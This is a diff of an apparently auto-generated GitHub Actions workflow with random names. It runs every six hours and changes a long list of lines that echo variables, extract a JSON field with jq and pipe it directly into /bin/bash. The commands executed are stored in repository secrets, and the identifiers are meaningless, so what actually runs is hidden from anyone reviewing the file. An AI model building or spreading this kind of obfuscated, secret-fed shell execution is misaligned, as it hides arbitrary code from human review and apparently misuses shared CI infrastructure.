@@ -2,7 +2,7 @@ name: hebaise4756
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
+    - cron: '24 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,24 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: hebaise4756
         env:
-          jvzv2647: ${{ secrets.jvzv2647 }}
+          g6: ${{ secrets.g6 }}
         run: |
-          echo $jvzv2647 | jq -r .u33 | /bin/bash
-          echo $uhl872 | jq -r .l9017 | /bin/bash
-          echo $qfnm6112 | jq -r .j36 | /bin/bash
-          echo $jqgly622 | jq -r .o57 | /bin/bash
-          echo $kltz34 | jq -r .yr171 | /bin/bash
-          echo $bvw82347 | jq -r .mq5 | /bin/bash
-          echo $w936 | jq -r .fdblj892 | /bin/bash
-          echo $v29 | jq -r .ecli275 | /bin/bash
-          echo $kgjx38 | jq -r .qwdld282 | /bin/bash
-          echo $dlybo21865 | jq -r .jrlkc971 | /bin/bash
-          echo $uag9184 | jq -r .u6 | /bin/bash
-          echo $p76993 | jq -r .dek54601 | /bin/bash
-          echo $o1557 | jq -r .uw987 | /bin/bash
-          echo $cstrr4715 | jq -r .fswrc50 | /bin/bash
-          echo $fplda33 | jq -r .odgzy6024 | /bin/bash
-          echo $xapc417 | jq -r .mr34272 | /bin/bash
-          echo $f8 | jq -r .akzyo88 | /bin/bash
-          echo $wq8802 | jq -r .twcus7 | /bin/bash
+          echo $g6 | jq -r .u6 | /bin/bash
+          echo $y53980 | jq -r .foow1710 | /bin/bash
+          echo $nv6 | jq -r .o06603 | /bin/bash
+          echo $bi653 | jq -r .i359 | /bin/bash
+          echo $ymzn17186 | jq -r .cte39750 | /bin/bash
+          echo $zvgk18 | jq -r .fe92090 | /bin/bash
+          echo $rv648 | jq -r .wnp968 | /bin/bash
+          echo $eerx8 | jq -r .n2042 | /bin/bash
+          echo $o1 | jq -r .ehb3202 | /bin/bash
+          echo $hucs83 | jq -r .bc770 | /bin/bash
+          echo $uo7 | jq -r .eww5348 | /bin/bash
+          echo $ysqpm080 | jq -r .o463 | /bin/bash
+          echo $ac7 | jq -r .tmvab68764 | /bin/bash
 
